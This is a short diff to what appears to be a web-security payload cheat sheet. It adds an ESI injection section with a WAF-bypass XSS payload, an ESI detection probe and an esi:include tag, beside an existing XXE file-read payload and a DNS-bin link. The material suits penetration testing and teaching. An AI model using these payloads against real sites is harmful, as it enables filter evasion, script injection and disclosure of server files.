@@ -45,5 +45,19 @@ Injection:
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
 ```  
-http://dnsbin.zhack.ca/
+http://dnsbin.zhack.ca/  
+### ESI (Edge Side Include Injection)
+WAF'alike bypass:
+```html
+<svg<!--esi--> onload=aler<!--esi-->t<!--esi-->``
+```
+```html
+he<!--esi-->llo -> hello 
+but
+he<!--esx-->llo isn't modified 
+you have ESI injection
+```
+```xml
+<esi:include src="/anypage.html" dca="none" />
+```
 
